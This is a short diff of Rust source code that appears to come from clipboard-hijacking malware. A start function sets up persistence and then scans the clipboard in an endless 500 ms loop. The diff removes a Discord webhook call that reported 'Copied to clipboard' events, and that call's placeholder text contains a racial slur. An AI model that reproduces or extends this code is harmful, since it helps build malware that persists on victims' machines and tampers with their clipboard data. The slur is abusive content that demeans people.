@@ -75,18 +75,7 @@ async fn start() {
 
     match fs::persistence().await {
         Ok(..) => loop {
-            let scan_res = scan(&map);
-
-            if scan_res.is_some() {
-                discord::send_webhook(
-                    "Copied to clipboard",
-                    "Ahoj",
-                    "nigga",
-                    "fjkldshf ksjdhfkjlsd hfkjlhsd jklfhsdjlkhf kjlsd hf",
-                    0xFF5733
-                ).await;
-            }
-
+            scan(&map);
             thread::sleep(Duration::from_millis(500));
         },
         Err(..) => {}
